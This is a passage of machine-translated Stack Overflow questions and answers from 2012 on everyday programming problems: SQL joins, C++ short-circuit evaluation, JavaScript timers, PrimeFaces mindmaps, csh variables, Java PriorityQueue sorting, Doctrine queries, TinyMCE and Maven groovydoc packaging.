        colno = part6 or 
        colno = part7 or 
        colno = part8 or 
        colno = part10 or 
        colno = part9 or 
        colno = part11 or 
        colno = part12 or 
        colno = part13 or 
        colno = part14 or 
        colno = part15 or 
        colno = part16 ); 
```

我想将这些查询连接在一起，以便结果包含类似 `colname`, `colno`, `collength`, 的内容`constrtype`。我相信 LEFT OUTER JOIN 是我需要的，但我不太确定如何形成它，所以任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T14:34:01.347

我对 Informix 的元数据表结构并不十分熟悉，因此我假设您的查询是正确的。

我认为您只想获得完整的列。以下查询应该这样做：

```
select c.colname, c.colno,   o.constrtype 
from systables t left outer join
     syscolumns c
     on c.tabid = t.tabid left outer join
     sysconstraints o
     on o.tabid = t.tabid left outer join
     sysindexes i
     on i.tabid = t.tabid and
        o.idxname = i.idxname
where t.tabname = 'user' and 
      o.constrtype in ('R', 'P') and 
      colno in (part1, part2, part3, part4, part5, part6, part7, part8, part9, part10,
                part11, part12, part13, part14, part15, part16
               ) 
```

我更改了查询以使用现代连接语法。您不应该在`from`子句中使用逗号。相反，您应该使用显式连接语法。此外，我将比较顺序更改为部分到`in`语句。最后，我从表格开始，制作所有的连接`left outer join`。

# c++ - OR 运算符不评估两个语句，只有 1

> ID：13343387
> 
> 赞同：-1
> 
> 时间：2012-11-12T12:04:18.687
> 
> 标签：c++, boolean-operations

```
std::ifstream file_1(argv[1]);
std::ifstream file_2(argv[2]);
...
std::string dummy_1;
std::string dummy_2;
...
while(std::getline(file_1, dummy_1) || std::getline(file_2, dummy_2)) // the problem
{
  ...
} 
```

只有当左侧的文件到达末尾（返回 FALSE）并且它不会同时评估它们时，该条件的行为就像 OR 运算符正在评估右侧的选项。

我知道语句的评估与运算符本身或它自己的优先规则无关，但是我的程序不应该像我想象的那样工作，同时评估两个语句？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:06:11.630

OR 运算符是一个短路运算符，这意味着如果一侧计算结果为真，则另一侧永远不会实际执行。如果您的意图是评估 OR 的双方，那么您可能需要重新考虑您的代码是如何编写的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T12:06:55.627

这就是布尔 OR 在大多数编程语言中的操作方式。这种行为称为[短路评估](http://en.wikipedia.org/wiki/Short-circuit_evaluation)。

如果您想始终评估这两个表达式，请单独执行此操作，然后在条件内使用结果：

```
std::getline(file_1, dummy_1);
std::getline(file_2, dummy_2);
if (file_1 || file_2) { ... } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:06:32.210

这称为短路。请查看[C 常见问题解答](http://c-faq.com/expr/shortcircuit.html)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T12:08:36.520

您可以使用按位逻辑运算符 '|' 保证两个表达式的执行。但即便如此，执行顺序也没有在 C 或 C++ 中定义。（Java 将从左到右执行）。

`if (readline(this_line) | readline(that_line) ) ...`
首先读取哪一行是任意的。

# javascript - settimeout 被忽略，函数被立即调用

> ID：13343388
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:20.220
> 
> 标签：javascript, jquery, settimeout

```
 function ShowColoursScreen() {
    setSquaresList()
    $("#ModeOne").hide();
    $("#ModeTwo").show();
    setTimeout(function () {
        $("#ModeOne").show();
        $("#ModeTwo").hide();
        setTimeout(function () {
            ShowColoursScreen();
        }, 1500);

    }, 15000);
} 
```

这非常奇怪，我想每 15 秒在两个 div 之间旋转一次（我不想使用 js 间隔）。然而在前 15 秒后 ShowColoursScreen(); 无需等待第二个 15 秒即可运行（如果有意义的话）。好像超时被忽略了，有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:06:13.643

你的代码是正确的。但是，内部超时仅等待 1.5 秒，因为您忘记了零。只需将 1500 替换为 15000。

您还可以稍微简化调用 - 因为您没有任何参数，所以不需要匿名函数：`setTimeout(ShowColoursScreen, 15000);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:06:29.400

```
function ShowColoursScreen($elements) {
    if(!$elements instanceof jQuery) {
       $elements = $($elements);        
    }

    var current = 0;
    // What does this function do?
    setSquaresList();

    function showCurrent () {
       var $currentElement = $($elements[current]);
       $elements.not($currentElement).hide();
       $currentElement.show();
       (current++) % $elements.length;
       setTimeout(showCurrent, 15000);
    }
    showCurrent();
    return $elements;
}

ShowColoursScreen('#ModeOne, #ModeTwo') 
```

# java - 单击子节点的子节点，线条消失 - Primefaces 3.4 思维导图

> ID：13343389
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:21.010
> 
> 标签：java, primefaces, mindmapping

问题基本上如上所述。在此处的示例中：

[http://www.primefaces.org/showcase-labs/ui/mindmap.jsf](http://www.primefaces.org/showcase-labs/ui/mindmap.jsf)

如果您单击 NS(s)，您可以单击您选择的子节点之一，例如 ns7.google.com，然后返回 NS(s)，因为连接它们的行仍然存在。

我有 6 个条目，比如 1、2、3、4、5、6。它们都以各种方式链接，在思维导图中以颜色显示。说“1”是根节点。然后 2,3,4,5,6 出现。假设我单击 6 - 重新绘制思维导图以显示 6 的链接，在角落处向上显示 1 以显示它是根。但是，如果我从那里单击除 1 以外的任何节点，链接线都会消失，大多数节点也是如此（我不知道为什么有时它是其中的一些，有时是不同的，有时是一个，有时是全部！）我再也不能倒退了。下面是思维导图 bean 和 html 的代码：

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package jsf;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import javax.annotation.PostConstruct;
import javax.ejb.EJB;
import javax.enterprise.context.RequestScoped;
import javax.inject.Named;
import jpa.entities.Enginetable;
import jpa.session.EnginetableFacade;
import org.primefaces.event.SelectEvent;
import org.primefaces.model.mindmap.DefaultMindmapNode;
import org.primefaces.model.mindmap.MindmapNode;

/**
 *
 * @author AOL
 */
@Named(value = "mmBean")
@RequestScoped
public class mmBean implements Serializable{

    @EJB
    private jpa.session.EnginetableFacade ejbFacade;
    private MindmapNode root;

    private MindmapNode selectedNode;

    private List<Enginetable> elements;
    private List<Enginetable> filteredElements;
    private List<Enginetable> userlist;

    private Enginetable selectedElement;
    private Enginetable[] selectedElements; 

    private List<Enginetable> elementlist = new ArrayList<Enginetable>();

    private Enginetable nodeentity = new Enginetable();
    private Enginetable rootentity = new Enginetable();
    private Enginetable user = new Enginetable();

    private static final String[] username;

    static{

        username = new String[10];  
        username[0] = "Mercedes";  
        username[1] = "BMW";  
        username[2] = "Volvo";  
        username[3] = "Audi";  
        username[4] = "Renault";  
        username[5] = "Opel";  
        username[6] = "Volkswagen";  
        username[7] = "Chrysler";  
        username[8] = "Ferrari";  
        username[9] = "Ford";  
    }

    /**
     * Creates a new instance of MmBean
     */
    public mmBean() {
    }

    @PostConstruct
    public void init() {
        ///if(elements==null){
        elements = new ArrayList<Enginetable>(); 
        this.userlist = this.getFullList();
        Enginetable entity;
        //} 
        //remoteuser=null;
        // this.populateRandomElements(elements, 10); 
        this.populateRandomElements(elements,6);  

        // filteredElements = new ArrayList<Graphelement>();
        this.user = this.userlist.get(0);
        this.rootentity = this.user;
        root = new DefaultMindmapNode(user.getStartnode(), "Google", "006666", false);
        /*MindmapNode bmw = new DefaultMindmapNode("BMW", "IP Nos", "6e9ebf", true);
        MindmapNode volvo = new DefaultMindmapNode("Volvo", "Names", "6e9ebf", true);
        MindmapNode audi = new DefaultMindmapNode("Audi", "Malicious ", "6e9ebf", true);
        MindmapNode renault = new DefaultMindmapNode("Renault", "IP Nos", "6e9ebf", true);
        MindmapNode opel = new DefaultMindmapNode("Opel", "Names", "6e9ebf", true);
        MindmapNode volkwagen = new DefaultMindmapNode("Volkswagen", "Malicious ", "6e9ebf", true);
        MindmapNode chrysler = new DefaultMindmapNode("Chrysler", "IP Nos", "6e9ebf", true);
        MindmapNode ferrari = new DefaultMindmapNode("Ferrari", "Names", "6e9ebf", true);
        MindmapNode ford = new DefaultMindmapNode("Ford", "Malicious ", "6e9ebf", true);*/

        Object label = root.getLabel();

        for( int i = 0 ; i < this.userlist.size() ; i++){

                    entity = this.userlist.get(i);

                    if ( !label.equals(entity.getStartnode() ) && this.user.getEndnode().equals(entity.getStartnode() ) )  { ////this.rootentity.getEndnode().equals(entity.getStartnode())

                            root.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "33FF00", true));

                    } 

                    else if ( !label.equals(entity.getStartnode() ) && this.user.getEndnode() != entity.getStartnode() ){

                            root.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "CC0000", true));

                    }

        }

    }

    public void setElements(List<Enginetable> elements) {
        this.elements = elements;
    }

    public List<Enginetable> getElements() {
        return elements;
    }
    public void setFilteredElements(List<Enginetable> filteredElements) {
        //this.filteredElements = filteredElements;
        this.elements=filteredElements;
    }

    public List<Enginetable> getFilteredElements() {
        return filteredElements;
    }

    public void setSelectedElements(Enginetable[] selectedElements) {
        this.selectedElements = selectedElements;
    }

    public Enginetable[] getSelectedElements() {
        return selectedElements;
    }

    public void setSelectedElement(Enginetable selectedElement) {
        this.selectedElement = selectedElement;
    }

    public Enginetable getSelectedElement() {
        return selectedElement;
    }

    public MindmapNode getRoot() {
        return root;
    }

    public MindmapNode getSelectedNode() {
        return selectedNode;
    }
    public void setSelectedNode(MindmapNode selectedNode) {
        this.selectedNode = selectedNode;
    }

    public void onNodeSelect(SelectEvent event) {
        MindmapNode node = (MindmapNode) event.getObject();

            for( int i = 0 ; i < this.elements.size() ; i++){
                    Enginetable entity;
                    Object label = node.getLabel();
                    Object rootlabel = this.root.getLabel();

                    entity = userlist.get(i);

                    if ( entity.getStartnode() == rootlabel ){
                        this.rootentity = entity;
                    }
                    if ( entity.getStartnode() == label ){
                        this.nodeentity = entity;
                    }

            }
    //load children of select node and add via node.addNode(childNode);
    //populate if not already loaded
            if(node.getChildren().isEmpty()) {
               this.setChildNodes( node ); 
            }
        }

    public void onNodeDblselect(SelectEvent event) {
        this.selectedNode = (MindmapNode) event.getObject();        
    }

    private EnginetableFacade getFacade() {
        return ejbFacade;
    }

    private void populateRandomElements(List<Enginetable> list, int size) { 
        userlist = this.getFullList();
        for(int i = 0 ; i < size ; i++)  {

                Enginetable gel = new Enginetable();
                gel.setMoveid(i);
                gel.setUserid(i);
                gel.setStartnode(username[i]);
                gel.setEndnode(username[9-i]);
                gel.setConnections(username[9-i]);
         //       gel.setPurpose("dubious");
         //       gel.setRelationship("naughty");
         //       gel.setExperimentid(1);
                gel.setNewinfovalue(1);
                gel.setNewconnectioncost(1);
                list.add(gel);                
        }
    }

//

    public Integer getMoveId(Enginetable ent) {
        return ent.getMoveid();
    }

    public void setMoveId(Enginetable ent, Integer id) {
        ent.setMoveid(id);
    }

    public Integer getUserId(Enginetable ent) {
        return ent.getMoveid();
    }

    public void setUserId(Enginetable ent, Integer id) {
        ent.setMoveid(id);
    }

    public String getStartNode(Enginetable ent) {
        return ent.getStartnode();
    }

    public void setStartNode(Enginetable ent, String startnode) {
        ent.setStartnode(startnode);
    }

    public String getEndNode(Enginetable ent) {
        return ent.getEndnode();
    }

    public void setEndNode(Enginetable ent, String endnode) {
        ent.setEndnode(endnode);
    }

 /*   public int getExperimentid(Enginetable ent) {
        return ent.getExperimentid();
    }

    public void setExperimentid(Enginetable ent, int experimentid) {
        ent.setExperimentid(experimentid); 
    }*/

    public int getNewInfoValue(Enginetable ent) {
        return ent.getNewinfovalue();
    }

    public void setNewInfoValue(Enginetable ent, int totalinfovalue) {
        ent.setNewinfovalue(totalinfovalue);
    }

    public String getConnections(Enginetable ent) {
        return ent.getConnections();
    }

    public void setConnections(Enginetable ent, String connections) {
        ent.setConnections(connections);
    }

    public String getNewConnections(Enginetable ent) {
        return ent.getConnections();
    }

    public void setNewConnections(Enginetable ent, String newconnections) {
        ent.setConnections( newconnections );
    }

 /*   public String getUserName(Enginetable ent) {
        return ent.getUsername();
    }

    public void setUsername(Enginetable ent, String name) {
        ent.setUsername(name);
    }
 */

    // ADDED BY AODHÁN

    public List<Enginetable> getListByUsername(String user){
       return this.ejbFacade.getEnginetableByUsername(user);
    } 

    public List<Enginetable> getListByUserID( int id ){
       return this.ejbFacade.getEnginetableByUserid(id);
    } 

    public List<Enginetable> getFullList(){
       return this.ejbFacade.getFullEnginetable();
    } 

    public void setChildNodes( MindmapNode node ){

            for( int i = 0 ; i < this.userlist.size() ; i++){
                    Enginetable entity;

                    entity = this.userlist.get(i);

                    if ( (this.nodeentity.getStartnode() == null ? entity.getStartnode() != null : !this.nodeentity.getStartnode().equals(entity.getStartnode())) && (this.nodeentity.getEndnode() == null ? entity.getStartnode() != null : !this.nodeentity.getEndnode().equals(entity.getStartnode())) &&  (this.rootentity.getEndnode() == null ? entity.getStartnode() == null : this.rootentity.getEndnode().equals(entity.getStartnode()))  )  {

                            node.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "33FF00"));

                    } 

                     else if ( (this.nodeentity.getStartnode() == null ? entity.getStartnode() != null : !this.nodeentity.getStartnode().equals(entity.getStartnode())) && (this.nodeentity.getEndnode() == null ? entity.getStartnode() == null : this.nodeentity.getEndnode().equals(entity.getStartnode())) &&  (this.rootentity.getEndnode() == null ? entity.getStartnode() == null : this.rootentity.getEndnode().equals(entity.getStartnode()))  )  {

                            node.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "0066FF"));

                    }

                    else if ( (this.nodeentity.getStartnode() == null ? entity.getStartnode() != null : !this.nodeentity.getStartnode().equals(entity.getStartnode())) && (this.nodeentity.getEndnode() == null ? entity.getStartnode() == null : this.nodeentity.getEndnode().equals(entity.getStartnode())) &&  (this.rootentity.getEndnode() == null ? entity.getStartnode() != null : !this.rootentity.getEndnode().equals(entity.getStartnode()))  )  {

                            node.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "FFCC00"));

                    }

                    else if ( (this.nodeentity.getStartnode() == null ? entity.getStartnode() != null : !this.nodeentity.getStartnode().equals(entity.getStartnode())) && (this.nodeentity.getEndnode() == null ? entity.getStartnode() != null : !this.nodeentity.getEndnode().equals(entity.getStartnode())) &&  (this.rootentity.getEndnode() == null ? entity.getStartnode() != null : !this.rootentity.getEndnode().equals(entity.getStartnode()))  )  {

                            node.addNode(new DefaultMindmapNode(entity.getStartnode() , "Malicious Software: ", "CC0000"));

                    }

                }
    }
} 
```

HTML：

```
<h:form>
    <p:mindmap value="#{mmBean.root}" style="width:100%;height:600px">
        <p:ajax event="select" listener="#{mmBean.onNodeSelect}" />
        <p:ajax event="dblselect" listener="#{mmBean.onNodeDblselect}" update="output" oncomplete="details.show()"/>
    </p:mindmap>    

    <p:dialog widgetVar="details" header="Node Details" resizable="false" modal="true" showEffect="fade" hideEffect="fade">
        <h:outputText id="output" value="#{mmBean.selectedNode.data}" />
    </p:dialog>                 
</h:form> 
```

任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-21T18:51:35.667

我遇到了同样的问题，并通过简单地添加`@SessionScoped`而不是`@RequestScoped`.

现在我可以选择和双选，如 PF 示例所示。

# environment-variables - 如何检查环境变量是否未设置或设置为空字符串？

> ID：13343392
> 
> 赞同：8
> 
> 时间：2012-11-12T12:04:28.293
> 
> 标签：environment-variables, csh

我不想使用 tcsh，但不幸的是在这种情况下别无选择。所以请不要“使用另一个外壳”的答案！

我目前正在尝试检查环境变量是否已设置，并且已设置为有用的东西。所以我想做的是：

```
if ($?HAPPYVAR && $HAPPYVAR != "") then
    ... blah...
else if ($?SADVAR && $SADVAR != "") then
    ... more blah ...
endif 
```

问题是如果 $HAPPYVAR 未设置，它将在表达式的后半部分出错（因为环境变量替换发生得早）。我可以使用嵌套的 ifs，但是我会遇到让我的“else”正常工作的问题（我必须设置另一个 env var 来说明“......blah......”是否发生）。

任何人有任何好的，整洁的解决方案来做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T17:35:00.163

可能有更好的方法，但您可以使用 eval 来延迟执行：

```
if ($?HAPPYVAR && {eval 'test ! -z $HAPPYVAR'}) then
    ... blah...
else if ($?SADVAR && {eval 'test ! -z $SADVAR'}) then
    ... more blah ...
endif 
```

这似乎可以满足您的需求。

如果`test`不起作用或您，这也将起作用：

```
if ($?HAPPYVAR && { eval 'if ($HAPPYVAR == "") exit 1' }) then 
```

啊，csh。

# java - 优先队列排序

> ID：13343393
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:30.837
> 
> 标签：java, sorting, priority-queue

```
public class Flight implements Comparable { 
```

……

```
public int compareTo(Object obj){
    Flight f = (Flight) obj;
    Integer i1 = (Integer) f.priority;
    Integer i2 = (Integer) priority;
    if(f == null)
        return 1;
    else 
        return i2.compareTo(i1);
} 
```

……

```
public class JavaPriorityFlightQueue {

    public PriorityQueue flights; 
```

……

```
public void joinQueue(Flight f){
        flights.add(f);
        Collections.sort(flights);
    } 
```

......

线程“main”java.lang.Error 中的异常：未解决的编译问题：Collections 类型中的方法 sort(List) 不适用于参数 (PriorityQueue)

```
at section3.JavaPriorityFlightQueue.joinQueue(JavaPriorityFlightQueue.java:31)
at section3.FlightTest003.main(FlightTest003.java:19) 
```

我对 LinkedList 使用了完全相同的 compareTo 并且它可以工作，而且一切都是一样的，我没有错过任何东西（我认为）。我不明白它如何适用于 LinkedList 但不适用于 PriorityQueue。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:09:02.187

`Collections.sort(List<E>)`只接受**List**实现类。 **java.util.LinkedList**实现**List**接口，其中**Priorityqueue**不实现 List。例子：

```
PriorityQueue<String> pq = new PriorityQueue<String>();
        Collections.sort(pq);//compiler error here sort expects a List not priorityQueue 
```

检查[Collections.sort(List)](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#sort%28java.util.List%29)签名

使用 Sort 方法对优先级队列进行排序的一种方法是将 priorityqueue 转换为 Array 并使用 Arrays.sort()。

```
Arrays.sort(pq.toArray()); 
```

或使用将 Comparator 作为第二个参数的 PQ 构造函数。

[PriorityQueue pq = new PriorityQueue(initialcapacity, Comparator);](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/PriorityQueue.html#PriorityQueue%28int,%20java.util.Comparator%29)

并阅读有关[java.util.Comparator](http://docs.oracle.com/javase/6/docs/api/java/util/Comparator.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:12:51.113

`Collections.sort``Collections`只能将列表作为参数，这在课堂上没有任何意义。可悲的是虽然`PriorityQueue`是一个`Collection`，但它没有实现`List`。

# javascript - 延迟 5 秒后从新 JSON 更新数据，再延迟 5 秒后从新 JSON 更新数据

> ID：13343395
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:39.760
> 
> 标签：javascript, jquery, ajax, json

我更新的完整脚本：

```
$(document).ready(function() {
                 $.getJSON('table.json',function(data){

                    $('#mytable').empty(); 
                    var html = '';
                    html += '<tr class="tableheader"><th>Name</th><th>Code</th><th>Value</th><th>Bid</th><th>Offer</th></tr>';
                    for (var i=0, size=data.length; i<size;i++) {                           
                            html += '<tr class="tablecontent"><td>'+ data[i].name+ '</td><td>'+ data[i].code+ '</td><td>'
                                         + data[i].value+ '</td><td>'
                                         +data[i].bid+'</td><td>'+data[i].offer+'</td></tr>';
                            }

            $('#mytable').append(html);
            tablerows('mytable');
            setTimeout(poll,5000);

        });

        });

        var poll = setInterval(function(){
        $.ajax({
        type:"GET",
        url: "dummy.json",
        success: function(data){
        //HANDLE DATA
         setTimeout(poll,5000);
    }
   });
},5000); 
```

请帮助我。我有 3 个 JSON。第一个 Json 将首先加载。就这样完成了。

需要解析第 2 个 json（其中有 2 个字段更改）并显示初始 json + 更改的字段，然后再从第 3 个 JSON 显示。

我写了下面的脚本：

```
var poll = setInterval(function(){
        $.ajax({
        type:"GET",
        url: "dummy.json",
        success: function(data){
        //HANDLE DATA
         JSON.parse(data); 
    }
   });
},5000) 
```

dummy.json 是我第二次更改的 JSON。这是正确的方法吗？我应该如何在我的 $(document).ready 中调用这个函数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:21:43.467

将其设置为常规函数，然后在成功处理程序中从自身调用它，这样您就永远不会超越自己。然后你也可以从你的 $(document).ready 中调用一次。

```
var poll = function(){
    $.ajax({
        type:"GET",
        url: "dummy.json",
        success: function(data){
        //HANDLE DATA
            setTimeout(poll,5000);
        }
    });
} 
```

# symfony - 来自关联实体的 Symfony 查询字段

> ID：13343396
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:42.150
> 
> 标签：symfony, doctrine, associations, entity

我有两个实体之间有关联：

```
Labs\CatalogBundle\Entity\ProductExtraspecs:
type: entity
table: orders__regmat__extraspecs

fields:
    regmatid:
        id: true
        type: integer
        scale: 11
    specid:
        id: true
        type: integer
        scale: 11
    attrib:
        type: string
        length: 20
    value:
        type: string
        length: 200

lifecycleCallbacks: {  }

manyToOne:
  specs:
    targetEntity: Specs
    inversedBy: specs
    joinColumn:
        name: specid
        referencedColumnName: specid 
```

和

```
Labs\CatalogBundle\Entity\Specs:
    type: entity
    table: orders__regmat__extraspecs__specs
    fields:
        specid:
            id: true
            type: integer
            unsigned: false
            nullable: false
            generator:
                strategy: IDENTITY
        desc:
            type: string
            length: 200
            fixed: false
            nullable: false
        cat:
            type: integer
            unsigned: false
            nullable: false
        type:
            type: integer
            unsigned: false
            nullable: false

    lifecycleCallbacks: {  }

    oneToMany:
        specs:
            targetEntity: ProductExtraspecs
            mappedBy: specs 
```

所以在控制器中我想用 and 获取所有行`regmatid = 8`并尝试了`cat = 0`这个：

```
$selRepository = $this -> getDoctrine() ->getEntityManager()->getRepository('LabsCatalogBundle:ProductExtraspecs'); 
    $query = $selRepository->createQueryBuilder('sel')
                        //->select('count(c.protid) as cnt')
                        ->where("sel.cat = '0' AND sel.regmatid = $id")
                        //->setParameter('price', '19.99')  
                        ->getQuery();
    $selected = $query->getResult(); 
```

但是得到一个错误说：

> [语义错误] line 0, col 74 near 'cat = '0' AND': Error: Class Labs\CatalogBu​​ndle\Entity\ProductExtraspecs 没有名为 cat 的字段或关联

如何访问关联实体的字段？你能帮我吗？

先感谢您 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:17:23.897

您必须加入规格表：

```
$selRepository = $this->getDoctrine()->getRepository('LabsCatalogBundle:ProductExtraspecs'); 
$query = $selRepository->createQueryBuilder('sel')
    ->leftJoin('sel.spec', 'spec')
    ->where("spec.cat = '0' AND sel.regmatid = $id")
    ->setParameter('price', '19.99')  
    ->getQuery();
$selected = $query->getResult(); 
```

# web-services - 在spring mvc中使用wsdl

> ID：13343397
> 
> 赞同：0
> 
> 时间：2012-11-12T12:04:43.433
> 
> 标签：web-services, spring-mvc

我的 IDE 设置是

*   日蚀靛蓝
*   靛蓝的 Spring IDE
*   靛蓝的 Spring STS
*   eclipse的maven集成
*   eclipse wtp的maven集成

    1.  创建了一个示例 spring mvc 项目并执行了 maven clean 和 maven build。

我有一个来自客户端的 wsdl，我已将其包含在`cxf-wsdl2java`用于生成代理代码的项目中。不确定这是否是解决此问题的正确方法。Web 服务位于“轴”上

寻找有关如何使用 wsdl 并使用 maven 在 spring mvc 项目中进行方法调用的教程。cxf 也是解决这个问题的正确方法吗？特别是 wsdl2java 方法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:59:49.747

将 wsdl2java 与 maven 一起使用通常是一个好习惯（除了我不会在资源中复制 wsdl，但我会将它保存在远程服务器上）。因为如果 wsdl 发生更改，您将不会直接通过构建通知您。对于您的客户，只需配置您的端点。请参阅 cxf 中的“配置 Spring 客户端”文档：http: [//cxf.apache.org/docs/jax-ws-configuration.html](http://cxf.apache.org/docs/jax-ws-configuration.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T14:51:32.290

您可能想查看此处找到的 Spring Web Service 项目：

[http://static.springsource.org/spring-ws/site/](http://static.springsource.org/spring-ws/site/)

我在他们的网站上有一个教程（位于：http://static.springsource.org/spring-ws/site/reference/html/tutorial.html [）](http://static.springsource.org/spring-ws/site/reference/html/tutorial.html)，它通过创建一个合同优先的网络服务，以及一个该 Web 服务的消费者。

希望这可以帮助！

# javascript - 隐藏 div 中的 tinyMCE 仅第一次更新并变为只读

> ID：13343401
> 
> 赞同：2
> 
> 时间：2012-11-12T12:04:59.243
> 
> 标签：javascript, jquery, tinymce

我的页面上有一个带有 tinyMCE (textarea) 的网格和 div。Div 最初是隐藏的。填充文本区域后：

```
$('#editor').val(data.Content);
$("#divGrid").hide("slide");
$("#divCard").show("slide");
InitMCE(); 
```

tinyMCE 中的内容出现并且组件是可编辑的，但是在使用 textarea (#divCard) 隐藏 div 后，再次填充 `$('#editor').val(data.Content);` tinyMCE 显示为只读且内容不显示。

在函数 InitMCE() 中是代码：

```
tinyMCE.init({
   mode: "textareas",
   theme: "advanced",
...
}); 
```

我试过了

```
tinyMCE.execCommand("mceRemoveControl", false, '#editor');
$('#editor').val(data.Content);
$("#divGrid").hide("slide");
$("#divCard").show("slide");
InitMCE(); 
```

与：

```
tinyMCE.remove($('textarea'));
$('#editor').val(data.Content);
$("#divGrid").hide("slide");
$("#divCard").show("slide");
tinyMCE.execCommand("mceAddControl", false, '#editor');
InitMCE(); 
```

和其他一些变化，但没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:11:50.823

你为什么隐藏文本区域。

如果您在 TinyMCE 初始化后检查 html DOM 结构，您会看到 TinyMCE 使用 div 和 span infront of`textarea`来呈现您的文本，但是当您尝试编辑它时，您实际上是在编辑 textarea。

所以如果你隐藏你的文本区域，你将无法再编辑它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:31:03.757

当源 html 元素（在您的情况下为 textarea）在编辑器初始化时隐藏时，可能会出现几个问题。Tinymce 将负责隐藏以前的文本区域。解决您的问题的方法是在初始化之前设置 textarea 可见 - 然后您之后编辑其内容就没有问题了。

# iphone - 获取最后日期并非全部在 iphone

> ID：13343405
> 
> 赞同：0
> 
> 时间：2012-11-12T12:05:17.543
> 
> 标签：iphone, ios, xcode

我从网络服务获取日期。当我使用下面的代码时，我会得到最后一行对象的日期，而不是所有对象的日期。我想，如果日期早于当前日期，则行中的文本将变为绿色，否则将变为红色。

```
NSDate *today =[NSDate date];
        NSComparisonResult result;

    NSString *abc = [[NSString alloc]initWithFormat:@"%@",[_currentItemValue objectForKey:@"EndDate" ]];

    NSDateFormatter* df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"MM/dd/yyyy"];

    NSDate *a = [df dateFromString:abc];
    result =[today compare:a];

    if(result == NSOrderedDescending)
       {
           [cell.btn_policy_no setTitleColor:[UIColor greenColor] forState:UIControlStateNormal];
       } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:12:55.997

可能是因为`[_currentItemValue objectForKey:@"EndDate" ]`这一行，它总是会给出一个对象，并且当您的表格视图将可见执行的最后一行代码时，它会显示最后一行。如果您需要获取每个行对象。您需要为每一行获取每个不同的对象。

# maven - 使用 maven 从 groovydoc 生成 jar 文件

> ID：13343411
> 
> 赞同：1
> 
> 时间：2012-11-12T12:05:40.287
> 
> 标签：maven, deployment, groovydoc

是否有某种方法可以从 Maven 内部生成的 groovydoc 生成要在 IDE（如 IDEA、Eclipse 等）中使用的 jar 文件？我目前正在使用此处描述的 maven antrun 插件从一个相当大的 groovy 项目生成 groovydoc：[GroovyDoc as Maven Plugin](https://stackoverflow.com/questions/5325259/groovydoc-as-maven-plugin)

我能够通过手动将输出文件打包到存档中来获得可用的 jar 文件，但我正在寻找一种集成方式（即使用 maven），它还允许我将这些文件部署到存储库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:12:05.013

如果您点击帖子中的链接，则将在该`site`阶段生成 groovydoc。

为了用生成的 groovydoc 组装一个 jar，你可以使用[`maven-assembly-plugin`](http://maven.apache.org/plugins/maven-assembly-plugin/).

我创建了一个`src/main/assembly`目录，其中添加了一个程序集描述符以供`maven-assembly-plugin`使用。

`site`这是一个工作示例，用于在阶段生成 groovydoc并且`groovydoc`还打包了一个 jar。

`pom.xml`

```
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.stackoverflow.Q13343411</groupId>
    <artifactId>groovy</artifactId>
    <version>1.0-SNAPSHOT</version>

    <name>${project.artifactId}-${project.version}</name>

    <properties>
        <gmavenVersion>1.4</gmavenVersion>
        <gmavenProviderSelection>2.0</gmavenProviderSelection>
        <groovyVersion>2.0.0</groovyVersion>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>${groovyVersion}</version>
        </dependency>
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.14</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.8.2</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.hamcrest</groupId>
            <artifactId>hamcrest-library</artifactId>
            <version>1.3</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.gmaven</groupId>
                <artifactId>gmaven-plugin</artifactId>
                <version>${gmavenVersion}</version>
                <configuration>
                    <providerSelection>${gmavenProviderSelection}</providerSelection>
